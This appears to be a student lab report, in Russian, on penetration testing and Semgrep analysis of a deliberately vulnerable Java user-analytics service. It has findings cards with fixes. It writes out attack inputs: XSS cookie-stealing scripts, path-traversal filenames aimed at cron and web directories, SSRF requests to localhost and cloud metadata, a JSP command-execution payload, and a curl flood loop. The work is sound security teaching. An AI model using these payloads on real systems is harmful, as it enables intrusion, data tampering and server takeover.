| 7 | Error Information Disclosure | [CWE-209](https://cwe.mitre.org/data/definitions/209.html) | POST `/recordSession` | MEDIUM | Confirmed |
| 8 | Uncontrolled Resource Consumption (DoS) | [CWE-400](https://cwe.mitre.org/data/definitions/400.html) | All endpoints | HIGH | Confirmed |
| 9 | Missing Logging/Auditing | [CWE-778](https://cwe.mitre.org/data/definitions/778.html) | All endpoints | HIGH | Confirmed |
| 10 | Improper Neutralization of Special Elements in Generated File (Code Injection) | [CWE-434](https://cwe.mitre.org/data/definitions/434.html) | GET `/exportReport` | CRITICAL | Confirmed |

## Примечания по классификации

- **Строка 135 в контроллере** (getUserName без escaping) → XSS
- **Строка 154 в контроллере** (новый File(REPORTS_BASE_DIR + filename)) → Path Traversal
- **Строка 180-181 в контроллере** (new URL(callbackUrl).openConnection()) → SSRF
- **Строка 46-51 в контроллере** (нет проверки userId в params) → Missing Authentication
- **Все эндпоинты** (нет проверки прав на чужие данные) → Missing Authorization
- **Строка 50 в сервисе** (new Session без валидации) → Improper Input Validation
- **Строка 74 в контроллере** ("Invalid data: " + e.getMessage()) → Error Information Disclosure
- **Все структуры данных** (HashMap, ArrayList без ограничений) → DoS
- **Весь контроллер** (нет логирования) → Missing Logging
- **Строка 154 + 157** (произвольная запись файлов) → Code Injection

---

# Этап 3.2 — Результаты ручного тестирования

## Подтверждённые уязвимости

### ✅ XSS в /userProfile (CONFIRMED)

**Запрос:**
```
POST /register?userId=xss1&userName=<script>alert(1)</script>
GET /userProfile?userId=xss1
```
**Ответ:**
```html
<html><body><h1>Profile: <script>alert(1)</script></h1><p>ID: xss1</p><p>Total activity: 0 min</p></body></html>
```
**Вывод:** `<script>` вставлен в HTML без экранирования. Браузер исполнит JS.

---

### ✅ Path Traversal в /exportReport (CONFIRMED)

**Запрос:**
```
GET /exportReport?userId=victim&filename=../../../../tmp/evil.txt
```
**Ответ:** `Report saved to: \tmp\reports\..\..\..\..\tmp\evil.txt`

**Проверка на диске:**
```
C:/tmp/evil.txt        → содержит данные пользователя (реально записан)
C:/tmp/evil_outside.txt → содержит данные пользователя (реально записан)
```
**Вывод:** Файлы записаны за пределами `/tmp/reports/`. URL-encoded `..%2F` также работает.

---

### ✅ SSRF в /notify (CONFIRMED)

**Запрос:**
```
POST /notify?userId=victim&callbackUrl=http://localhost:7000/userProfile?userId=alice
```
**Ответ:**
```
Notification sent. Response: <html><body><h1>Profile: Bob</h1><p>ID: alice</p>...
```
**Вывод:** Сервер выполнил HTTP-запрос к самому себе и вернул ответ атакующему.

**Цепная атака SSRF + Path Traversal:**
```
POST /notify?userId=victim&callbackUrl=http://localhost:7000/exportReport?userId=victim%26filename=../chained_attack.txt
```
Результат: файл `C:/tmp/chained_attack.txt` создан — подтверждена цепная эксплуатация.

---

### ✅ Missing Authorization — Tampering чужих данных (CONFIRMED)

**Запрос:**
```
POST /recordSession?userId=alice&loginTime=2023-01-01T00:00:00&logoutTime=2023-12-31T23:59:59
GET /totalActivity?userId=alice
```
**Ответ:** `Total activity: 525599 minutes` (данные alice изменены без авторизации)

---

### ✅ Improper Input Validation — отрицательные сессии (CONFIRMED)

**Запрос:**
```
POST /recordSession?userId=victim&loginTime=2024-01-01T17:00:00&logoutTime=2024-01-01T09:00:00
GET /totalActivity?userId=victim
```
**Ответ:** `Total activity: 0 minutes`

**Вывод:** Сессия с `logoutTime < loginTime` принята. `ChronoUnit.MINUTES.between()` вернул отрицательное число, которое компенсировало реальную активность (480 минут → 0). Можно занулить активность любого пользователя.

---

### ✅ Error Information Disclosure (CONFIRMED)

**Запросы:**
```
POST /recordSession?userId=victim&loginTime=invalid-date&logoutTime=2024-01-01T17:00:00
→ "Invalid data: Text 'invalid-date' could not be parsed at index 0"

GET /monthlyActivity?userId=nonexistent&month=2024-01
→ "Invalid data: No sessions found for user"
```
**Вывод:** Раскрывается внутренняя логика парсера и состояние хранилища.

---

### ✅ User Enumeration через коды ответа (CONFIRMED)

```
GET /userProfile?userId=nonexistent  → HTTP 404
GET /userProfile?userId=victim       → HTTP 200
```
**Вывод:** Атакующий может перебором определить существующих пользователей.

---

### ✅ Пустые параметры принимаются (CONFIRMED)

```
POST /register?userId=emptyname&userName=   → User registered: true
GET /totalActivity?userId=                  → Total activity: 0 minutes
```
**Вывод:** Пустые строки не отклоняются — нет валидации на пустые значения.

---

## Уязвимости с частичным результатом

### ⚠️ /inactiveUsers — 500 из-за отсутствия jackson-databind

```
GET /inactiveUsers?days=7   → HTTP 500 "no object mapper configured"
```
**Причина:** В запущенной версии приложения отсутствует зависимость `jackson-databind`.  
**Вывод:** Эндпоинт полностью неработоспособен в текущей конфигурации (CWE-1104 — использование неподдерживаемой конфигурации).

### ⚠️ SSRF к облачным метаданным

```
POST /notify?userId=victim&callbackUrl=http://169.254.169.254/latest/meta-data/
→ Notification failed: Network is unreachable
```
**Вывод:** Сервер пытается соединиться (запрос уходит), но тестовая среда не AWS. В облаке было бы эксплуатируемо.

---

## Сводная таблица по результатам

| # | Уязвимость | Статус | Реальный эффект |
|---|-----------|--------|-----------------|
| 1 | Reflected XSS | ✅ CONFIRMED | Выполнение JS в браузере жертвы |
| 2 | Path Traversal | ✅ CONFIRMED | Файлы записаны за пределами `/tmp/reports/` |
| 3 | SSRF | ✅ CONFIRMED | Сервер читает внутренние эндпоинты |
| 4 | SSRF + Path Traversal chain | ✅ CONFIRMED | Файл создан через цепную атаку |
| 5 | Missing Authorization | ✅ CONFIRMED | Сессии записаны за чужого пользователя |
| 6 | Отрицательные сессии | ✅ CONFIRMED | Активность жертвы обнулена |
| 7 | Error Information Disclosure | ✅ CONFIRMED | Раскрыта внутренняя логика парсера |
| 8 | User Enumeration | ✅ CONFIRMED | 404 vs 200 позволяет перебирать userId |
| 9 | Пустые параметры | ✅ CONFIRMED | userId="" и userName="" принимаются |
| 10 | /inactiveUsers broken (missing dep) | ⚠️ 500 | Эндпоинт недоступен |
| 11 | SSRF к cloud metadata | ⚠️ Env | Нет AWS-среды, но код уязвим |

---

# Этап 4 — Статический анализ с Semgrep

## Инструмент и версия

- **Semgrep** v1.161.0 (community edition)
- Дата сканирования: 2026-05-19
- Исходники: `src/main/java/ru/itmo/testing/lab4/` (6 файлов)

## Проблемы, выявленные при запуске

### Проблема 1 — UnicodeEncodeError на Windows (p/owasp-top-ten)

При запуске стандартного пака `p/owasp-top-ten` semgrep падал с ошибкой:

```
UnicodeEncodeError: 'charmap' codec can't encode character '❌'
  File "semgrep\config_resolver.py", line 991, in parse_config_string
    fp.write(contents)
  File "encodings\cp1251.py", line 19, in encode
    return codecs.charmap_encode(input,self.errors,encoding_table)[0]
```

**Причина:** semgrep написан на Python и пишет временные файлы правил в кодировке системной локали (cp1251 на русской Windows). Правила из реестра содержат emoji-символы (`❌`, `✅`), которые не входят в cp1251.

**Обходной путь:** запуск с переменными окружения `PYTHONUTF8=1 PYTHONIOENCODING=utf-8`.

### Проблема 2 — 0 findings от стандартных паков (p/java, p/owasp-top-ten)

После исправления кодировки оба пака запустились (241 и 245 правил), однако вернули **0 findings**, несмотря на наличие XSS, Path Traversal и SSRF в коде.

**Причина:** уязвимости в данном приложении требуют **taint-анализа** — отслеживания потока данных от источника (`ctx.queryParam(...)`) до точки использования (`new File(...)`, `new URL(...)`, `ctx.result(...)`). Taint-анализ в Semgrep реализован только в **Pro/платной версии**. Community-версия проверяет лишь синтаксические паттерны в пределах одного выражения.

| Пак | Правил запущено | Findings | Причина нулевого результата |
|-----|----------------|----------|-----------------------------|
| `p/java` | 241 | 0 | Taint-уязвимости требуют Pro |
| `p/owasp-top-ten` (community) | 245 | 0 | Аналогично + баг кодировки |

### Решение — кастомные правила (semgrep-custom.yml)

Написаны 7 правил, ищущих конкретные синтаксические паттерны без taint-анализа:

| Rule ID | Паттерн | CWE |
|---------|---------|-----|
| `xss-html-string-concat` | конкатенация user-data в HTML через переменную | CWE-79 |
| `xss-html-direct-concat` | прямая конкатенация в `ctx.contentType("text/html").result(...)` | CWE-79 |
| `path-traversal-file-concat` | `new File($BASE + $PARAM)` | CWE-22 |
| `unrestricted-file-write` | `new FileWriter(...)` на пути из user input | CWE-434 |
| `ssrf-url-from-param` | `new URL($VAR)` — переменная вместо литерала | CWE-918 |
| `error-info-disclosure` | `ctx.status(...).result(... + e.getMessage())` | CWE-209 |
| `error-info-disclosure-result` | `ctx.result(... + e.getMessage())` | CWE-209 |

## Результаты сканирования (semgrep-custom.yml)

**Итог:** 11 findings по 4 типам уязвимостей в файле `UserAnalyticsController.java`.

### Детальные findings

#### Finding S-1 — Path Traversal (строка 154)

| Поле | Значение |
|------|----------|
| **Rule ID** | `path-traversal-file-concat` |
| **Level** | `error` |
| **CWE** | CWE-22 |
| **Файл** | `UserAnalyticsController.java:154` |
| **Верификация** | True Positive |

```java
// Строка 154 — user-controlled filename конкатенируется в путь без валидации
File reportFile = new File(REPORTS_BASE_DIR + filename);
```

---

#### Finding S-2 — Arbitrary File Write (строка 157)

| Поле | Значение |
|------|----------|
| **Rule ID** | `unrestricted-file-write` |
| **Level** | `error` |
| **CWE** | CWE-434 / CWE-22 |
| **Файл** | `UserAnalyticsController.java:157` |
| **Верификация** | True Positive |

```java
// Строка 157 — запись в файл, путь которого из user input
try (FileWriter writer = new FileWriter(reportFile)) {
```

---

#### Finding S-3 — SSRF (строка 180)

| Поле | Значение |
|------|----------|
| **Rule ID** | `ssrf-url-from-param` |
| **Level** | `error` |
| **CWE** | CWE-918 |
| **Файл** | `UserAnalyticsController.java:180` |
| **Верификация** | True Positive |

```java
// Строка 180 — URL создаётся из параметра запроса без валидации
URL url = new URL(callbackUrl);
```

---

#### Finding S-4 — Error Info Disclosure (строки 74, 115, 163, 189)

| Поле | Значение |
|------|----------|
| **Rule ID** | `error-info-disclosure` / `error-info-disclosure-result` |
| **Level** | `warning` |
| **CWE** | CWE-209 |
| **Файл** | `UserAnalyticsController.java:74,115,163,189` |
| **Верификация** | True Positive (4 экземпляра) |

```java
// Строка 74
ctx.status(400).result("Invalid data: " + e.getMessage());
// Строка 115
ctx.status(400).result("Invalid data: " + e.getMessage());
// Строка 163
ctx.status(500).result("Failed to write report: " + e.getMessage());
// Строка 189
ctx.status(500).result("Notification failed: " + e.getMessage());
```

---

## False Negatives (что Semgrep не нашёл)

| Уязвимость | CWE | Причина пропуска |
|-----------|-----|-----------------|
| Reflected XSS | CWE-79 | Многостроковый taint: `user.getUserName()` → переменная `html` → `ctx.result(html)`. Синтаксический паттерн не охватывает передачу через переменную; требуется taint-анализ (Pro) |
| Missing Authentication | CWE-306 | Отсутствие кода — semgrep не умеет искать "отсутствие проверки" без специальной модели |
| Missing Authorization | CWE-862 | Аналогично — проблема в отсутствии паттерна, а не его наличии |
| Improper Input Validation | CWE-20 | Логическая уязвимость (loginTime > logoutTime не проверяется) — stateful, semgrep не находит |

## Сводная таблица: Semgrep vs ручное тестирование

| Уязвимость | CWE | Semgrep | Ручное тестирование |
|-----------|-----|---------|---------------------|
| Path Traversal | CWE-22 | ✅ найдено | ✅ подтверждено |
| Arbitrary File Write | CWE-434 | ✅ найдено | ✅ подтверждено |
| SSRF | CWE-918 | ✅ найдено | ✅ подтверждено |
| Error Info Disclosure | CWE-209 | ✅ найдено (4×) | ✅ подтверждено |
| Reflected XSS | CWE-79 | ❌ false negative | ✅ подтверждено |
| Missing Authentication | CWE-306 | ❌ false negative | ✅ подтверждено |
| Missing Authorization | CWE-862 | ❌ false negative | ✅ подтверждено |
| Improper Input Validation | CWE-20 | ❌ false negative | ✅ подтверждено |

**Вывод:** Semgrep (community) нашёл 4 из 8 типов уязвимостей. Инструмент хорошо справляется с синтаксически-очевидными паттернами (прямое использование user input в опасных API). Логические уязвимости, multi-step taint и "отсутствие кода" требуют ручного тестирования. SARIF-отчёт сохранён в `semgrep-report.sarif`.

---

# Этап 5 — Карточки уязвимостей

---

## Finding #1 — Reflected XSS

| Поле | Значение |
|------|----------|
| **Компонент** | `GET /userProfile`, `UserAnalyticsController.java:134-139` |
| **Тип** | Stored/Reflected Cross-Site Scripting |
| **CWE** | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Improper Neutralization of Input During Web Page Generation |
| **CVSS v3.1** | `6.1 MEDIUM (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)` |
| **Статус** | Confirmed |

**Описание:**
Эндпоинт `/userProfile` возвращает HTML-страницу, в которую вставляется `userName` пользователя без экранирования. Значение попадает в хранилище через `/register`, откуда его может установить любой клиент. При открытии профиля браузер жертвы исполнит произвольный JavaScript.

**Шаги воспроизведения:**
```
1. POST /register?userId=evil&userName=<script>alert(document.cookie)</script>
2. GET /userProfile?userId=evil
   Ожидаемый результат: имя отображается как текст, спецсимволы экранированы
   Фактический результат: <script>alert(document.cookie)</script> выполняется браузером
```

**Влияние:**
Атакующий может похитить сессионные cookie, выполнить действия от имени жертвы, перенаправить на фишинговый сайт.

**Рекомендации по исправлению:**
Использовать `StringEscapeUtils.escapeHtml4()` (Apache Commons Text) перед вставкой любых пользовательских данных в HTML. Установить заголовок `Content-Security-Policy`.

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/XssPentestTest.java
// Полный тест уже реализован в этом файле (пример от преподавателя)
```

---

## Finding #2 — Path Traversal

| Поле | Значение |
|------|----------|
| **Компонент** | `GET /exportReport`, `UserAnalyticsController.java:154` |
| **Тип** | Path Traversal / Directory Traversal |
| **CWE** | [CWE-22](https://cwe.mitre.org/data/definitions/22.html) — Improper Limitation of a Pathname to a Restricted Directory |
| **CVSS v3.1** | `9.1 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)` |
| **Статус** | Confirmed |

**Описание:**
Параметр `filename` подставляется непосредственно в конструктор `new File(REPORTS_BASE_DIR + filename)` без нормализации пути. Последовательность `../` позволяет выйти за пределы `/tmp/reports/` и записать файл в произвольное место на сервере.

**Шаги воспроизведения:**
```
1. POST /register?userId=victim&userName=Alice
2. GET /exportReport?userId=victim&filename=../../../../tmp/evil.txt
   Ожидаемый результат: 400 Bad Request или файл создан только в /tmp/reports/
   Фактический результат: "Report saved to: \tmp\reports\..\..\..\..\tmp\evil.txt"
                          Файл C:/tmp/evil.txt создан на диске вне базовой директории
```

**Влияние:**
Запись в произвольные директории: перезапись конфигурации, деплой вредоносных файлов (`.jsp`, `.class`), потенциальный RCE. Через SSRF-цепочку достижимо без прямого доступа к эндпоинту.

**Рекомендации по исправлению:**
```java
Path base = Paths.get(REPORTS_BASE_DIR).toAbsolutePath().normalize();
Path resolved = base.resolve(filename).normalize();
if (!resolved.startsWith(base)) {
    ctx.status(400).result("Invalid filename");
    return;
}
```

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/PathTraversalPentestTest.java
@Test
@DisplayName("[EXPLOIT] Path traversal записывает файл вне базовой директории")
void pathTraversalWritesOutsideBaseDir() { ... }
```

---

## Finding #3 — Server-Side Request Forgery (SSRF)

| Поле | Значение |
|------|----------|
| **Компонент** | `POST /notify`, `UserAnalyticsController.java:180-186` |
| **Тип** | Server-Side Request Forgery |
| **CWE** | [CWE-918](https://cwe.mitre.org/data/definitions/918.html) — Server-Side Request Forgery |
| **CVSS v3.1** | `8.6 HIGH (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)` |
| **Статус** | Confirmed |

**Описание:**
`callbackUrl` передаётся напрямую в `new URL(callbackUrl).openConnection()` без валидации схемы и хоста. Сервер выполняет HTTP-запрос от своего имени и возвращает атакующему содержимое ответа. Это позволяет использовать сервер как прокси для доступа к внутренней сети.

**Шаги воспроизведения:**
```
1. POST /register?userId=victim&userName=Alice
2. POST /notify?userId=victim&callbackUrl=http://localhost:7000/userProfile?userId=victim
   Ожидаемый результат: 400 Bad Request (внутренние адреса запрещены)
   Фактический результат: "Notification sent. Response: <html><body><h1>Profile: Alice</h1>..."
   Сервер вернул внутренний HTML-ответ атакующему.
```

**Влияние:**
Доступ к внутренним сервисам (Redis, PostgreSQL, admin-панели), чтение облачных метаданных (`http://169.254.169.254/`), цепная атака SSRF + Path Traversal.

**Рекомендации по исправлению:**
Реализовать allowlist допустимых хостов/схем. Запретить `localhost`, `127.0.0.1`, link-local адреса (`169.254.x.x`), схемы `file://`, `dict://`. Использовать DNS rebinding protection.

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/SsrfPentestTest.java
@Test
@DisplayName("[EXPLOIT] SSRF — сервер читает внутренний эндпоинт через callbackUrl")
void ssrfAccessesInternalEndpoint() { ... }
```

---

## Finding #4 — Missing Authentication

| Поле | Значение |
|------|----------|
| **Компонент** | Все эндпоинты, `UserAnalyticsController.java` |
| **Тип** | Missing Authentication for Critical Function |
| **CWE** | [CWE-306](https://cwe.mitre.org/data/definitions/306.html) — Missing Authentication for Critical Function |
| **CVSS v3.1** | `9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)` |
| **Статус** | Confirmed |

**Описание:**
Ни один эндпоинт не требует аутентификации. `userId` передаётся как query-параметр и принимается на веру. Любой неавторизованный клиент может выполнить любую операцию от имени любого пользователя без каких-либо учётных данных.

**Шаги воспроизведения:**
```
1. POST /register?userId=victim&userName=Alice   (жертва регистрируется)
2. GET /totalActivity?userId=victim              (атакующий читает данные жертвы)
   Ожидаемый результат: 401 Unauthorized
   Фактический результат: 200 "Total activity: 480 minutes"
```

**Влияние:**
Полная компрометация данных всех пользователей. Запись активности, экспорт отчётов, отправка уведомлений — всё доступно без авторизации.

**Рекомендации по исправлению:**
Внедрить механизм аутентификации (JWT, API-ключи, OAuth 2.0). Валидировать токен на каждом запросе через middleware перед обработкой.

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/AuthorizationPentestTest.java
@Test
@DisplayName("[EXPLOIT] Любой клиент читает данные чужого пользователя без аутентификации")
void unauthenticatedClientReadsOtherUserData() { ... }
```

---

## Finding #5 — Missing Authorization

| Поле | Значение |
|------|----------|
| **Компонент** | Все эндпоинты, `UserAnalyticsController.java` |
| **Тип** | Missing Authorization / Broken Access Control |
| **CWE** | [CWE-862](https://cwe.mitre.org/data/definitions/862.html) — Missing Authorization |
| **CVSS v3.1** | `8.1 HIGH (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)` |
| **Статус** | Confirmed |

**Описание:**
Отсутствует проверка прав доступа к ресурсам. Пользователь, зная `userId` другого пользователя, может читать его данные, записывать сессии от его имени и генерировать отчёты. Нет разграничения между "читать свои данные" и "читать чужие данные".

**Шаги воспроизведения:**
```
1. POST /register?userId=alice&userName=Alice
2. POST /register?userId=bob&userName=Bob
3. POST /recordSession?userId=alice&loginTime=2023-01-01T00:00:00&logoutTime=2023-12-31T23:59:59
   (запрос отправляет bob, подставив userId=alice)
   Ожидаемый результат: 403 Forbidden
   Фактический результат: "Session recorded" — данные alice изменены
4. GET /totalActivity?userId=alice → 525599 minutes (данные alice фальсифицированы)
```

**Влияние:**
Горизонтальная эскалация привилегий: пользователь может читать и изменять данные любого другого пользователя системы.

**Рекомендации по исправлению:**
Проверять, что аутентифицированный пользователь запрашивает только свои ресурсы. Реализовать RBAC или ABAC.

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/AuthorizationPentestTest.java
@Test
@DisplayName("[EXPLOIT] Пользователь записывает сессию от имени другого пользователя")
void userTampersOtherUserSessions() { ... }
```

---

## Finding #6 — Improper Input Validation (отрицательные сессии)

| Поле | Значение |
|------|----------|
| **Компонент** | `POST /recordSession`, `UserAnalyticsService.java:50` |
| **Тип** | Improper Input Validation — Business Logic Flaw |
| **CWE** | [CWE-20](https://cwe.mitre.org/data/definitions/20.html) — Improper Input Validation |
| **CVSS v3.1** | `6.5 MEDIUM (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)` |
| **Статус** | Confirmed |

**Описание:**
Сервис принимает сессии, где `logoutTime < loginTime`, без какой-либо проверки логики. `ChronoUnit.MINUTES.between(login, logout)` возвращает отрицательное число, которое суммируется с реальной активностью. Атакующий может обнулить или сделать отрицательной накопленную активность любого пользователя.

**Шаги воспроизведения:**
```
1. POST /register?userId=victim&userName=Alice
2. POST /recordSession?userId=victim&loginTime=2024-01-01T09:00:00&logoutTime=2024-01-01T17:00:00
3. GET /totalActivity?userId=victim → "Total activity: 480 minutes"
4. POST /recordSession?userId=victim&loginTime=2024-01-01T17:00:00&logoutTime=2024-01-01T09:00:00
   (logoutTime раньше loginTime — "отрицательная" сессия)
5. GET /totalActivity?userId=victim
   Ожидаемый результат: 400 Bad Request (logoutTime < loginTime)
   Фактический результат: "Total activity: 0 minutes" (480 - 480 = 0)
```

**Влияние:**
Манипуляция данными активности: обнуление статистики жертвы, фальсификация отчётов, нарушение целостности аналитических данных.

**Рекомендации по исправлению:**
```java
if (!logoutTime.isAfter(loginTime)) {
    ctx.status(400).result("logoutTime must be after loginTime");
    return;
}
```

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/InputValidationPentestTest.java
@Test
@DisplayName("[EXPLOIT] Отрицательная сессия обнуляет реальную активность пользователя")
void negativeSessionZerosOutActivity() { ... }
```

---

## Finding #7 — Error Information Disclosure

| Поле | Значение |
|------|----------|
| **Компонент** | `POST /recordSession`, `GET /monthlyActivity`, `GET /exportReport`, `POST /notify` — `UserAnalyticsController.java:74,115,163,189` |
| **Тип** | Information Exposure Through an Error Message |
| **CWE** | [CWE-209](https://cwe.mitre.org/data/definitions/209.html) — Generation of Error Message Containing Sensitive Information |
| **CVSS v3.1** | `5.3 MEDIUM (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)` |
| **Статус** | Confirmed |

**Описание:**
В четырёх местах контроллера `e.getMessage()` возвращается напрямую в тело HTTP-ответа. Это раскрывает внутренние детали: имена классов парсеров, сообщения об ошибках из библиотек, внутренние состояния сервиса.

**Шаги воспроизведения:**
```
POST /recordSession?userId=victim&loginTime=INVALID&logoutTime=2024-01-01T00:00:00
   Ожидаемый результат: "Invalid request"
   Фактический результат: "Invalid data: Text 'INVALID' could not be parsed at index 0"
   (раскрыта внутренняя логика java.time.format.DateTimeFormatter)

GET /monthlyActivity?userId=victim&month=2024-01
   (пользователь без сессий)
   Фактический результат: "Invalid data: No sessions found for user"
   (раскрыта логика хранения данных)
```

**Влияние:**
Помогает атакующему понять внутреннее устройство приложения, облегчает построение более точных атак. Может раскрыть версии библиотек, имена классов.

**Рекомендации по исправлению:**
Логировать детальное сообщение об ошибке на сервере, клиенту возвращать только обобщённый текст: `ctx.status(400).result("Invalid request")`.

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/ErrorDisclosurePentestTest.java
@Test
@DisplayName("[EXPLOIT] Невалидная дата раскрывает внутренние детали парсера")
void invalidDateRevealsParserDetails() { ... }
```

---

## Finding #8 — Uncontrolled Resource Consumption (DoS)

| Поле | Значение |
|------|----------|
| **Компонент** | `POST /register`, `POST /recordSession`, `POST /notify` — `UserAnalyticsService.java:18-19` |
| **Тип** | Uncontrolled Resource Consumption |
| **CWE** | [CWE-400](https://cwe.mitre.org/data/definitions/400.html) — Uncontrolled Resource Consumption |
| **CVSS v3.1** | `7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)` |
| **Статус** | Confirmed |

**Описание:**
Хранилище (`HashMap<String, User>`, `HashMap<String, List<Session>>`) не имеет ограничений на количество записей. Нет rate limiting ни на одном эндпоинте. Атакующий может зарегистрировать неограниченное количество пользователей или добавить миллионы сессий одному пользователю, исчерпав оперативную память сервера (OutOfMemoryError).

**Шаги воспроизведения:**
```
# Без ограничений принимает бесконечное число запросов:
for i in {1..100000}; do
  curl -X POST "http://localhost:7000/register?userId=user_$i&userName=User_$i"
done
# → OutOfMemoryError, сервер перестаёт отвечать

# Альтернатива: миллионы сессий одному пользователю
# → GET /totalActivity начинает занимать секунды из-за обхода ArrayList
```

**Влияние:**
Полный отказ в обслуживании: крах JVM из-за OutOfMemoryError, деградация производительности при большом числе сессий.

**Рекомендации по исправлению:**
Внедрить rate limiting (например, Bucket4j), ограничить максимальное число пользователей и сессий на пользователя, использовать персистентное хранилище с индексами.

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/DosPentestTest.java
@Test
@DisplayName("[EXPLOIT] Отсутствие rate limiting — регистрация тысяч пользователей без отказа")
void noRateLimitingAllowsMassRegistration() { ... }
```

---

## Finding #9 — Missing Logging and Auditing

| Поле | Значение |
|------|----------|
| **Компонент** | Весь `UserAnalyticsController.java` |
| **Тип** | Insufficient Logging and Monitoring |
| **CWE** | [CWE-778](https://cwe.mitre.org/data/definitions/778.html) — Insufficient Logging |
| **CVSS v3.1** | `4.3 MEDIUM (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)` |
| **Статус** | Confirmed |

**Описание:**
В приложении отсутствует какое-либо логирование запросов, ошибок и критичных операций. Нет аудит-трейла: невозможно установить, кто, когда и откуда выполнял операции. После инцидента (например, Path Traversal или SSRF-атаки) восстановить хронологию событий невозможно.

**Шаги воспроизведения:**
```
1. POST /exportReport?userId=victim&filename=../../../../etc/cron.d/evil
   (атака Path Traversal — файл записан)
2. Проверить логи приложения
   Ожидаемый результат: запись в лог с userId, filename, IP-адресом, timestamp
   Фактический результат: логов нет — атака неотслеживаема
```

**Влияние:**
Невозможно обнаружить атаку в реальном времени, восстановить картину инцидента, соответствовать требованиям GDPR/compliance (отсутствие аудит-логов).

**Рекомендации по исправлению:**
Добавить структурированное логирование через SLF4J/Logback. Логировать: IP-адрес, метод, путь, userId, статус ответа, timestamp для каждого запроса. Критичные операции (`/exportReport`, `/notify`) логировать отдельно.

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/DosPentestTest.java
@Test
@DisplayName("[SECURITY] После атаки Path Traversal сервер не предоставляет аудит-трейл")
void noAuditTrailAfterAttack() { ... }
```

---

## Finding #10 — Arbitrary File Write (Path Traversal + File Upload)

| Поле | Значение |
|------|----------|
| **Компонент** | `GET /exportReport`, `UserAnalyticsController.java:154-160` |
| **Тип** | Unrestricted File Write / Arbitrary File Write |
| **CWE** | [CWE-434](https://cwe.mitre.org/data/definitions/434.html) — Unrestricted Upload of File with Dangerous Type |
| **CVSS v3.1** | `9.1 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)` |
| **Статус** | Confirmed |

**Описание:**
Комбинация Path Traversal (Finding #2) и произвольной записи содержимого (имя пользователя контролируется атакующим через `/register`). Атакующий регистрирует пользователя с именем, содержащим вредоносный код, затем экспортирует отчёт по traversal-пути. В итоге на диске сервера создаётся файл с атакующим содержимым в произвольном месте.

**Шаги воспроизведения:**
```
1. POST /register?userId=rce&userName=<%Runtime.getRuntime().exec("calc")%>
2. GET /exportReport?userId=rce&filename=../../../../var/www/html/shell.jsp
   Ожидаемый результат: 400 Bad Request (недопустимый путь или расширение)
   Фактический результат: JSP-файл с вредоносным кодом записан в директорию web-сервера
```

**Влияние:**
Remote Code Execution: если на сервере работает JSP-контейнер (Tomcat/Jetty), созданный файл будет исполнен при обращении к нему. Полная компрометация сервера.

**Рекомендации по исправлению:**
Ограничить содержимое отчёта — не использовать raw userName. Проверять путь (см. Finding #2). Запретить опасные расширения (`.jsp`, `.php`, `.class`). Запускать приложение с минимальными правами на файловую систему.

**Security Test Case:**
```java
// src/test/java/ru/itmo/testing/lab4/pentest/PathTraversalPentestTest.java
@Test
@DisplayName("[EXPLOIT] Arbitrary file write: вредоносное имя пользователя попадает в файл вне базовой директории")
void maliciousUsernameWrittenOutsideBaseDir() { ... }
```

